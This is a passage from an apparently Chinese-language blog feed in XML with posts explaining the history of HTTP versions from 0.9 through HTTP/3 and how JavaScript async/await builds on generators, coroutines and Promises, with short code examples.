src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%BA%8C%EF%BC%89/img5.png" class=""></li><li><p><strong>实现了快速握手功能</strong>。由于 QUIC 是基于 UDP 的，所以 QUIC 可以实现使用 0-RTT 或者 1-RTT 来建立连接，这意味着 QUIC 可以用最快的速度来发送和接收数据，这样可以大大提升首次打开页面的速度。</p></li></ul><p>在 2018 年，互联网标准化组织 IETF 提议将“HTTP over QUIC”更名为“HTTP/3”并获得批准，HTTP/3 正式进入了标准化制订阶段，也许几年后就会正式发布。</p><p>虽说这套协议解决了 HTTP/2 中因 TCP 而带来的问题，不过由于是改动了底层协议，所以推广起来还会面临着巨大的挑战。</p>]]></content>
    
    
    <categories>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
      <tag>HTTP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP的前世今生（一）</title>
    <link href="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>如果说程序员要拜祖师爷，那个人一定是图灵。如果前端程序员要拜祖师爷，除了图灵，还要拜一拜 蒂姆·伯纳斯·李。蒂姆·伯纳斯·李的大名我想不用多赘述，他不仅发明了万维网，还创立了世界上第一个网站。如此创世之举，值得我们这些享受他福利的受益者仰视。除此之外，他还发明了 HTTP ，即超文本传输协议。有了 HTTP 后，才可以将超文本系统完美的运行在互联网上，让各地的人们能够自由的共享信息。</p><p>如今，随着浏览器的发展，HTTP 为了能适应新的的形式也在持续进化。了解 HTTP 发展中的痛点我认为是学习 HTTP 的最佳途径。所以这篇文章会主要介绍 HTTP 版本升级的过程和升级的原因。</p><h2 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h2><p>首先我们来看看诞生最早的 HTTP/0.9。HTTP/0.9 是于 1991 年提出的，主要用于学术交流，需求很简单——用来在网络之间传递 HTML 超文本的内容，所以被称为<strong>超文本传输协议</strong>。整体来看，它的实现也很简单，采用了基于请求响应的模式，从客户端发出请求，服务器返回数据。</p><p>下面我们就来看看 HTTP/0.9 的一个完整的请求流程：</p><ul><li>因为 HTTP 都是基于 TCP 协议的，所以客户端先要根据 IP 地址、端口和服务器建立 TCP 连接，而建立连接的过程就是 TCP 协议三次握手的过程。</li><li>建立好连接之后，会发送一个 GET 请求行的信息，如GET /index.html用来获取 index.html。</li><li>服务器接收请求信息之后，读取对应的 HTML 文件，并将数据以 ASCII 字符流返回给客户端。</li><li>HTML 文档传输完成后，断开连接。</li></ul><img src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%B8%80%EF%BC%89/img.png" class=""><p>总的来说，当时的需求很简单，就是用来传输体积很小的 HTML 文件，所以 HTTP/0.9 的实现有以下三个特点。</p><ul><li>第一个是只有一个请求行，并没有 HTTP 请求头和请求体，因为只需要一个请求行就可以完整表达客户端的需求了。</li><li>第二个是服务器也没有返回头信息，这是因为服务器端并不需要告诉客户端太多信息，只需要返回数据就可以了。</li><li>第三个是返回的文件内容是以 ASCII 字符流来传输的，因为都是 HTML 格式的文件，所以使用 ASCII 字节码来传输是最合适的。</li></ul><p>20 世纪 90 年代初期的互联网世界非常简陋，计算机处理能力低，存储容量小，网速很慢，还是一片“信息荒漠”。网络上绝大多数的资源都是纯文本，很多通信协议也都使用纯文本，所以 HTTP 的设计也不可避免地受到了时代的限制。</p><p>这一时期的 HTTP 被定义为 0.9 版，结构比较简单，为了便于服务器和客户端处理，它也采用了纯文本格式。蒂姆·伯纳斯·李最初设想的系统里的文档都是只读的，所以只允许用“GET”动作从服务器上获取 HTML 文档，并且在响应请求之后立即关闭连接，功能非常有限。</p><p>HTTP/0.9 虽然很简单，但它作为一个“原型”，充分验证了 Web 服务的可行性，而“简单”也正是它的优点，蕴含了进化和扩展的可能性，因为：<strong>“把简单的系统变复杂”，要比“把复杂的系统变简单”容易得多</strong>。</p><h2 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h2><p>1993 年，NCSA（美国国家超级计算应用中心）开发出了 Mosaic，是第一个可以图文混排的浏览器，随后又在 1995 年开发出了服务器软件 Apache，简化了 HTTP 服务器的搭建工作。</p><p>同一时期，计算机多媒体技术也有了新的发展：1992 年发明了 JPEG 图像格式，1995 年发明了 MP3 音乐格式。</p><p>由于这些新技术的发展，<strong>HTTP/0.9 已经不能满足传输多种类型文件等需求</strong>，所以这个时候 HTTP/1.0 诞生了。在 HTTP/1.0 中，支持<strong>多种类型的文件下载是 HTTP/1.0 的一个核心诉求</strong>，而且文件格式不仅仅局限于 ASCII 编码，还有很多其他类型编码的文件。</p><h3 id="那么该如何实现多种类型文件的下载呢？"><a href="#那么该如何实现多种类型文件的下载呢？" class="headerlink" title="那么该如何实现多种类型文件的下载呢？"></a>那么该如何实现多种类型文件的下载呢？</h3><p>前面说过，HTTP 是浏览器和服务器之间的通信语言，不过 HTTP/0.9 在建立好连接之后，只会发送类似GET /index.html的简单请求命令，并没有其他途径告诉服务器更多的信息，如文件编码、文件类型等。同样，服务器是直接返回数据给浏览器的，也没有其他途径告诉浏览器更多的关于服务器返回的文件信息。</p><p>这种简单的交流型形式无疑不能满足传输多种类型文件的需求，那为了让客户端和服务器能更深入地交流，HTTP/1.0 引入了请求头和响应头，它们都是以为 Key-Value 形式保存的，在 HTTP 发送请求时，会带上请求头信息，服务器返回数据时，会先返回响应头信息。至于 HTTP/1.0 具体的请求流程，你可以参考下图。</p><img src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%B8%80%EF%BC%89/img1.png" class=""><p>有了请求头和响应头，浏览器和服务器就能进行更加深入的交流了。</p><h3 id="那-HTTP-1-0-是怎么通过请求头和响应头来支持多种不同类型的数据呢？"><a href="#那-HTTP-1-0-是怎么通过请求头和响应头来支持多种不同类型的数据呢？" class="headerlink" title="那 HTTP/1.0 是怎么通过请求头和响应头来支持多种不同类型的数据呢？"></a>那 HTTP/1.0 是怎么通过请求头和响应头来支持多种不同类型的数据呢？</h3><p>要支持多种类型的文件，我们就需要解决以下几个问题。</p><ul><li>首先，浏览器需要知道服务器返回的数据是什么类型的，然后浏览器才能根据不同的数据类型做针对性的处理。</li><li>其次，由于万维网所支持的应用变得越来越广，所以单个文件的数据量也变得越来越大。为了减轻传输性能，服务器会对数据进行压缩后再传输，所以浏览器需要知道服务器压缩的方法。</li><li>再次，由于万维网是支持全球范围的，所以需要提供国际化的支持，服务器需要对不同的地区提供不同的语言版本，这就需要浏览器告诉服务器它想要什么语言版本的页面。</li><li>最后，由于增加了各种不同类型的文件，而每种文件的编码形式又可能不一样，为了能够准确地读取文件，浏览器需要知道文件的编码类型。</li></ul><p>基于以上问题，HTTP/1.0 的方案是通过请求头和响应头来进行协商，在发起请求时候会通过 HTTP 请求头告诉服务器它期待服务器返回什么类型的文件、采取什么形式的压缩、提供什么语言的文件以及文件的具体编码。最终发送出来的请求头内容如下：</p><pre><code class="hljs jsx">accept: text/html <span class="hljs-comment">//期望服务器返回 html 类型的文件</span>accept-encoding: gzip, deflate, br <span class="hljs-comment">//期望服务器采用 gzip、deflate、br 其中的一种压缩方式</span>accept-Charset: ISO<span class="hljs-number">-8859</span><span class="hljs-number">-1</span>,utf<span class="hljs-number">-8</span> <span class="hljs-comment">//期望返回的文件编码是 UTF-8 或者 ISO-8859-1</span>accept-language: zh-CN,zh <span class="hljs-comment">//期望页面的优先语言是中文</span></code></pre><p>服务器接收到浏览器发送过来的请求头信息之后，会根据请求头的信息来准备响应数据。不过有时候会有一些意外情况发生，比如浏览器请求的压缩类型是 gzip，但是服务器不支持 gzip，只支持 br 压缩，那么它会通过响应头中的 content-encoding 字段告诉浏览器最终的压缩类型，也就是说最终浏览器需要根据响应头的信息来处理数据。下面是一段响应头的数据信息：</p><pre><code class="hljs jsx">content-encoding: br <span class="hljs-comment">//服务器采用了 br 的压缩方法</span>content-type: text/html; charset=UTF<span class="hljs-number">-8</span> <span class="hljs-comment">//服务器返回的是 html 文件，并且该文件的编码类型是 UTF-8</span></code></pre><p>有了响应头的信息，浏览器就会使用 br 方法来解压文件，再按照 UTF-8 的编码格式来处理原始文件，最后按照 HTML 的方式来解析该文件。这就是 HTTP/1.0 支持多文件的一个基本的处理流程。</p><p>HTTP/1.0 除了对多文件提供良好的支持外，还依据当时实际的需求引入了很多其他的特性，这些特性都是通过请求头和响应头来实现的。下面我们来看看新增的几个典型的特性：</p><ul><li>有的请求服务器可能无法处理，或者处理出错，这时候就需要告诉浏览器服务器最终处理该请求的情况，这就引入了<strong>状态码</strong>。状态码是通过响应行的方式来通知浏览器的。</li><li>为了减轻服务器的压力，在 HTTP/1.0 中提供了 <strong>Cache 机制</strong>，用来缓存已经下载过的数据。</li><li>服务器需要统计客户端的基础信息，比如 Windows 和 macOS 的用户数量分别是多少，所以 HTTP/1.0 的请求头中还加入了<strong>用户代理</strong>的字段。</li></ul><p>但 HTTP/1.0 并不是一个“标准”，只是记录已有实践和模式的一份参考文档，不具有实际的约束力，相当于一个“备忘录”。</p><h2 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h2><p>1995 年，网景的 Netscape Navigator 和微软的 Internet Explorer 开始了著名的“浏览器大战”，都希望在互联网上占据主导地位。</p><img src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%B8%80%EF%BC%89/img2.png" class=""><p>这场战争的结果你一定早就知道了，最终微软的 IE 取得了决定性的胜利，而网景则“败走麦城”（但后来却凭借 Mozilla Firefox 又扳回一局）。</p><p>“浏览器大战”的是非成败我们放在一边暂且不管，不可否认的是，它再一次极大地推动了 Web 的发展，HTTP/1.0 也在这个过程中经受了实践检验。于是在“浏览器大战”结束之后的 1999 年，HTTP/1.1 发布了 RFC 文档，编号为 2616，正式确立了延续十余年的传奇。</p><p>从版本号我们就可以看到，HTTP/1.1 是对 HTTP/1.0 的小幅度修正。但一个重要的区别是：它是一个“正式的标准”，而不是一份可有可无的“参考文档”。这意味着今后互联网上所有的浏览器、服务器、网关、代理等等，只要用到 HTTP 协议，就必须严格遵守这个标准，相当于是互联网世界的一个“立法”。</p><p>不过，说 HTTP/1.1 是“小幅度修正”也不太确切，它还是有很多实质性进步的。毕竟经过了多年的实战检验，比起 0.9/1.0 少了“学术气”，更加“接地气”，同时表述也更加严谨。那么我们来看看 HTTP/1.1 的主要变更点。</p><ol><li><p>改进持久连接</p><p> HTTP/1.0 每进行一次 HTTP 通信，都需要经历建立 TCP 连接、传输 HTTP 数据和断开 TCP 连接三个阶段（如下图）。</p> <img src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%B8%80%EF%BC%89/img3.png" class=""><p> 在当时，由于通信的文件比较小，而且每个页面的引用也不多，所以这种传输形式没什么大问题。但是随着浏览器普及，单个页面中的图片文件越来越多，有时候一个页面可能包含了几百个外部引用的资源文件，如果在下载每个文件的时候，都需要经历建立 TCP 连接、传输数据和断开连接这样的步骤，无疑会增加大量无谓的开销。</p><p> 为了解决这个问题，<strong>HTTP/1.1 中增加了持久连接的方法，它的特点是在一个 TCP 连接上可以传输多个 HTTP 请求，只要浏览器或者服务器没有明确断开连接，那么该 TCP 连接会一直保持。</strong></p> <img src="/2020/08/17/HTTP%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88%E4%B8%80%EF%BC%89/img4.png" class=""><p> 从上图可以看出，HTTP 的持久连接可以有效减少 TCP 建立连接和断开连接的次数，这样的好处是减少了服务器额外的负担，并提升整体 HTTP 的请求时长。</p><p> 持久连接在 HTTP/1.1 中是默认开启的，所以你不需要专门为了持久连接去 HTTP 请求头设置信息，如果你不想要采用持久连接，可以在 HTTP 请求头中加上Connection: close。目前浏览器中对于同一个域名，默认允许同时建立 6 个 TCP 持久连接。</p></li><li><p>不成熟的 HTTP 管线化</p><p> 持久连接虽然能减少 TCP 的建立和断开次数，但是它需要等待前面的请求返回之后，才能进行下一次请求。如果 TCP 通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后面的所有请求，这就是著名的<strong>队头阻塞</strong>问题。</p><p> HTTP/1.1 中试图通过管线化的技术来解决队头阻塞的问题。HTTP/1.1 中的管线化是指将多个 HTTP 请求整批提交给服务器的技术，虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求。</p><p> FireFox、Chrome 都做过管线化的试验，但是由于各种原因，它们最终都放弃了管线化技术。</p></li><li><p>提供虚拟主机的支持</p><p> 在 HTTP/1.0 中，每个域名绑定了一个唯一的 IP 地址，因此一个服务器只能支持一个域名。但是随着虚拟主机技术的发展，需要实现在一台物理主机上绑定多个虚拟主机，每个虚拟主机都有自己的单独的域名，这些单独的域名都公用同一个 IP 地址。</p><p> 因此，HTTP/1.1 的请求头中增加了 <strong>Host 字段</strong>，用来表示当前的域名地址，这样服务器就可以根据不同的 Host 值做不同的处理。</p></li><li><p>对动态生成的内容提供了完美支持</p><p> 在设计 HTTP/1.0 时，需要在响应头中设置完整的数据大小，如Content-Length: 901，这样浏览器就可以根据设置的数据大小来接收数据。不过随着服务器端的技术发展，很多页面的内容都是动态生成的，因此在传输数据之前并不知道最终的数据大小，这就导致了浏览器不知道何时会接收完所有的文件数据。</p><p> HTTP/1.1 通过引入 <strong>Chunk transfer 机制</strong>来解决这个问题，服务器会将数据分割成若干个任意大小的数据块，每个数据块发送时会附上上个数据块的长度，最后使用一个零长度的块作为发送数据完成的标志。这样就提供了对动态内容的支持。</p></li><li><p>客户端 Cookie、安全机制</p><p> 除此之外，HTTP/1.1 还引入了客户端 Cookie 机制和安全机制。</p></li></ol><p>HTTP/1.1 的推出可谓是“众望所归”，互联网在它的“保驾护航”下迈开了大步，由此走上了“康庄大道”，开启了后续的“Web 1.0”“Web 2.0”时代。现在许多的知名网站都是在这个时间点左右创立的，例如 Google、新浪、搜狐、网易、腾讯等。</p><p>不过由于 HTTP/1.1 太过庞大和复杂，所以在 2014 年又做了一次修订，原来的一个大文档被拆分成了六份较小的文档，编号为 7230-7235，优化了一些细节，但此外没有任何实质性的改动。</p>]]></content>
    
    
    <categories>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
      <tag>HTTP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浏览器是怎么实现async/await的？</title>
    <link href="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0async-await%E7%9A%84%EF%BC%9F/"/>
    <url>/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0async-await%E7%9A%84%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<p>众所周知，JavaScript 是单线程语言，但是在实际业务场景中，却有大量的异步场景。在早期只能通过回调函数的方式处理异步操作，但回调函数的方式也出现了一些弊端，比如回调地狱，代码逻辑不连续等。后来社区经过探索推出了 <strong>Promise</strong>，使得处理异步逻辑变得线性，基本解决了回调函数的问题。接着又出现了基于 Generator 函数的异步方案，最后出现了 async/await，可以说它比较完美的解决了 JS 中异步操作问题。</p><p>async/await 从某种层面上来说是基于 Promise 的语法糖。其最大优点就是使得异步代码看起来像同步代码，让代码逻辑更加清晰。既然 async/await 是 Promise 的语法糖，那么是否能用 Promise 来实现 async/await ？解答这个问题之前，我们先来看一段代码：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params">duration</span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">resolve</span>) </span>&#123;        <span class="hljs-built_in">setTimeout</span>(resolve, duration);    &#125;);&#125;<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;sleep start&#x27;</span>);    <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">1000</span>);    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;sleep end&#x27;</span>);&#125;</code></pre><p>代码中，我们实现了一个 sleep 函数，它返回一个 Promise 。在 main 函数中，我们先打印一个 Log，然后在 await 关键词后面执行 sleep 函数，最后再打印一个 Log。main 函数运行的效果就是先打印一句 “sleep start” ，然后 1 秒后再打印 “sleep end” 。</p><p>await 有个关键的表现就是，它可以使当前函数中断执行，等到 await 后面的 Promise  resolve后，才继续执行下面的语句。如果只用 Promise，是无法实现上面代码中 await 的中断效果的。在 JavaScript 中只有 Generator 函数可以实现函数中断效果。所以，使用 Generator + Promise，就可以实现 async/await。</p><p>以前的文章宏我们已经讲过浏览器中 Promise 的实现原理，其原理就是创建一个微任务。那么  Generator 函数中神奇的中断效果，浏览器是如何实现的，我们今天来探索一下。</p><h2 id="Generator-函数"><a href="#Generator-函数" class="headerlink" title="Generator 函数"></a>Generator 函数</h2><p>我们先来看看 Generator 函数：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span>* <span class="hljs-title">genDemo</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;开始执行第一段&quot;</span>)    <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;generator 2&#x27;</span>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;开始执行第二段&quot;</span>)    <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;generator 2&#x27;</span>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;开始执行第三段&quot;</span>)    <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;generator 2&#x27;</span>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;执行结束&quot;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;generator 2&#x27;</span>&#125;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;main 0&#x27;</span>)<span class="hljs-keyword">let</span> gen = genDemo()<span class="hljs-built_in">console</span>.log(gen.next().value)<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;main 1&#x27;</span>)<span class="hljs-built_in">console</span>.log(gen.next().value)<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;main 2&#x27;</span>)<span class="hljs-built_in">console</span>.log(gen.next().value)<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;main 3&#x27;</span>)<span class="hljs-built_in">console</span>.log(gen.next().value)<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;main 4&#x27;</span>)</code></pre><p>Generator 函数的调用方法与普通函数一样，也是在函数名后面加上一对圆括号。不同的是，调用 Generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象（Iterator Object）。</p><p>下一步，必须调用遍历器对象的<code>next</code>方法，使得指针移向下一个状态。也就是说，每次调用<code>next</code>方法，内部指针就从函数头部或上一次停下来的地方开始执行，直到遇到下一个<code>yield</code>表达式（或<code>return</code>语句）为止。换言之，Generator 函数是分段执行的，<code>yield</code>表达式是暂停执行的标记，而<code>next</code>方法可以恢复执行。</p><p>执行上面这段代码，观察输出结果，你会发现函数 genDemo 并不是一次执行完的，全局代码和 genDemo 函数交替执行。其实这就是生成器函数的特性，可以暂停执行，也可以恢复执行。</p><p>如此神奇的效果，相信你一定很好奇这其中的实现原理。那么接下来我们就来简单介绍下 JavaScript 引擎 V8 是如何实现一个函数的暂停和恢复的。</p><h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>要搞懂函数为何能暂停和恢复，那你首先要了解协程的概念。</p><p><strong>协程是一种比线程更加轻量级的存在</strong>。你可以把协程看成是跑在线程上的任务，一个线程上可以存在多个协程，但是在线程上同时只能执行一个协程，比如当前执行的是 A 协程，要启动 B 协程，那么 A 协程就需要将主线程的控制权交给 B 协程，这就体现在 A 协程暂停执行，B 协程恢复执行；同样，也可以从 B 协程中启动 A 协程。通常，如果从 A 协程启动 B 协程，我们就把 A 协程称为 B 协程的父协程。</p><p>正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。最重要的是，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行）。这样带来的好处就是性能得到了很大的提升，不会像线程切换那样消耗资源。</p><p>为了让你更好地理解协程是怎么执行的，我结合上面那段代码的执行过程，画出了下面的“协程执行流程图”，你可以对照着代码来分析：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0async-await%E7%9A%84%EF%BC%9F/img.png" class=""><p>从图中可以看出来协程的四点规则：</p><ol><li>通过调用生成器函数 genDemo 来创建一个协程 gen，创建之后，gen 协程并没有立即执行。</li><li>通过调用 gen.next，使 gen 协程执行。</li><li>yield 关键字的作用是暂停 gen 协程的执行，并返回主要信息给父协程。</li><li>return 关键字的作用是关闭当前协程，并将 return 后面的内容返回给父协程。</li></ol><p>不过，对于上面这段代码，你可能又有这样疑问：父协程有自己的调用栈，gen 协程时也有自己的调用栈，当 gen 协程通过 yield 把控制权交给父协程时，V8 是如何切换到父协程的调用栈？当父协程通过 gen.next 恢复 gen 协程时，又是如何切换 gen 协程的调用栈？</p><p>要搞清楚上面的问题，你需要关注以下两点内容。</p><ul><li>gen 协程和父协程是在主线程上交互执行的，并不是并发执行的，它们之前的切换是通过 yield 和 gen.next 来配合完成的。</li><li>当在 gen 协程中调用了 yield 方法时，JavaScript 引擎会保存 gen 协程当前的调用栈信息，并恢复父协程的调用栈信息。同样，当在父协程中执行 gen.next 时，JavaScript 引擎会保存父协程的调用栈信息，并恢复 gen 协程的调用栈信息。</li></ul><p>为了直观理解父协程和 gen 协程是如何切换调用栈的，你可以参考下图：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0async-await%E7%9A%84%EF%BC%9F/img1.png" class=""><p>到这里相信你已经弄清楚了协程是怎么工作的，其实在 JavaScript 中，生成器就是协程的一种实现方式，这样相信你也就理解什么是生成器了。那么接下来，我们使用生成器和 Promise 来改造开头的那段 Promise 代码。改造后的代码如下所示：</p><pre><code class="hljs jsx"><span class="hljs-comment">//foo函数</span><span class="hljs-function"><span class="hljs-keyword">function</span>* <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">let</span> response1 = <span class="hljs-keyword">yield</span> fetch(<span class="hljs-string">&#x27;https://www.geekbang.org&#x27;</span>)    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;response1&#x27;</span>)    <span class="hljs-built_in">console</span>.log(response1)    <span class="hljs-keyword">let</span> response2 = <span class="hljs-keyword">yield</span> fetch(<span class="hljs-string">&#x27;https://www.geekbang.org/test&#x27;</span>)    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;response2&#x27;</span>)    <span class="hljs-built_in">console</span>.log(response2)&#125;<span class="hljs-comment">//执行foo函数的代码</span><span class="hljs-keyword">let</span> gen = foo()<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getGenPromise</span>(<span class="hljs-params">gen</span>) </span>&#123;    <span class="hljs-keyword">return</span> gen.next().value&#125;getGenPromise(gen).then(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> &#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;response1&#x27;</span>)    <span class="hljs-built_in">console</span>.log(response)    <span class="hljs-keyword">return</span> getGenPromise(gen)&#125;).then(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> &#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;response2&#x27;</span>)    <span class="hljs-built_in">console</span>.log(response)&#125;)</code></pre><p>从图中可以看到，foo 函数是一个生成器函数，在 foo 函数里面实现了用同步代码形式来实现异步操作；但是在 foo 函数外部，我们还需要写一段执行 foo 函数的代码，如上述代码的后半部分所示，那下面我们就来分析下这段代码是如何工作的。</p><ul><li>首先执行的是let gen = foo()，创建了 gen 协程。</li><li>然后在父协程中通过执行 gen.next 把主线程的控制权交给 gen 协程。</li><li>gen 协程获取到主线程的控制权后，就调用 fetch 函数创建了一个 Promise 对象 response1，然后通过 yield 暂停 gen 协程的执行，并将 response1 返回给父协程。</li><li>父协程恢复执行后，调用 response1.then 方法等待请求结果。</li><li>等通过 fetch 发起的请求完成之后，会调用 then 中的回调函数，then 中的回调函数拿到结果之后，通过调用 gen.next 放弃主线程的控制权，将控制权交 gen 协程继续执行下个请求。</li></ul><p>以上就是协程和 Promise 相互配合执行的一个大致流程。不过通常，我们把执行生成器的代码封装成一个函数，并把这个执行生成器代码的函数称为<strong>执行器</strong>（可参考著名的 co 框架），如下面这种方式：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span>* <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">let</span> response1 = <span class="hljs-keyword">yield</span> fetch(<span class="hljs-string">&#x27;https://www.geekbang.org&#x27;</span>)    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;response1&#x27;</span>)    <span class="hljs-built_in">console</span>.log(response1)    <span class="hljs-keyword">let</span> response2 = <span class="hljs-keyword">yield</span> fetch(<span class="hljs-string">&#x27;https://www.geekbang.org/test&#x27;</span>)    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;response2&#x27;</span>)    <span class="hljs-built_in">console</span>.log(response2)&#125;co(foo());</code></pre><p>通过使用生成器配合执行器，就能实现使用同步的方式写出异步代码了，这样也大大加强了代码的可读性。</p><h2 id="async-await：异步编程的“终极”方案"><a href="#async-await：异步编程的“终极”方案" class="headerlink" title="async/await：异步编程的“终极”方案"></a>async/await：异步编程的“终极”方案</h2><p>由于生成器函数可以暂停，因此我们可以在生成器内部编写完整的异步逻辑代码，不过生成器依然需要使用额外的 co 函数来驱动生成器函数的执行，这一点非常不友好。</p><p>基于这个原因，ES7 引入了 async/await，这是 JavaScript 异步编程的一个重大改进，它改进了生成器的缺点，提供了在不阻塞主线程的情况下使用同步代码实现异步访问资源的能力。你可以参考下面这段使用 async/await 改造后的代码：</p><pre><code class="hljs jsx"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getResult</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-keyword">let</span> id_res = <span class="hljs-keyword">await</span> fetch(id_url)        <span class="hljs-keyword">let</span> id_text = <span class="hljs-keyword">await</span> id_res.text()        <span class="hljs-built_in">console</span>.log(id_text)        <span class="hljs-keyword">let</span> new_name_url = name_url+<span class="hljs-string">&quot;?id=&quot;</span>+id_text        <span class="hljs-built_in">console</span>.log(new_name_url)        <span class="hljs-keyword">let</span> name_res = <span class="hljs-keyword">await</span> fetch(new_name_url)        <span class="hljs-keyword">let</span> name_text = <span class="hljs-keyword">await</span> name_res.text()        <span class="hljs-built_in">console</span>.log(name_text)    &#125; <span class="hljs-keyword">catch</span> (err) &#123;        <span class="hljs-built_in">console</span>.error(err)    &#125;&#125;getResult()</code></pre><p>观察上面这段代码，你会发现整个异步处理的逻辑都是使用同步代码的方式来实现的，而且还支持 try catch 来捕获异常，这就是完全在写同步代码，所以非常符合人的线性思维。</p><p>虽然这种方式看起来像是同步代码，但是实际上它又是异步执行的，也就是说，在执行到 await fetch 的时候，整个函数会暂停等待 fetch 的执行结果，等到函数返回时，再恢复该函数，然后继续往下执行。</p><p>其实 async/await 技术背后的秘密就是 Promise 和生成器应用，往底层说，就是微任务和协程应用。要搞清楚 async 和 await 的工作原理，我们就得对 async 和 await 分开分析。</p><p>我们先来看看 async 到底是什么。根据 MDN 定义，async 是一个<strong>通过异步执行并隐式返回 Promise</strong> 作为结果的函数。</p><p>这里需要重点关注异步执行这个词，简单地理解，如果在 async 函数里面使用了 await，那么此时 async 函数就会暂停执行，并等待合适的时机来恢复执行，所以说 async 是一个异步执行的函数。</p><p>那么暂停之后，什么时机恢复 async 函数的执行呢？</p><p>要解释这个问题，我们先来看看，V8 是如何处理 await 后面的内容的。</p><p>通常，await 可以等待两种类型的表达式：</p><ul><li>可以是任何普通表达式。</li><li>也可以是一个 Promise 对象的表达式。</li></ul><p>如果 await 等待的是一个 Promise 对象，它就会暂停执行生成器函数，直到 Promise 对象的状态变成 resolve，才会恢复执行，然后得到 resolve 的值，作为 await 表达式的运算结果。</p><p>我们看下面这样一段代码：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">NeverResolvePromise</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span 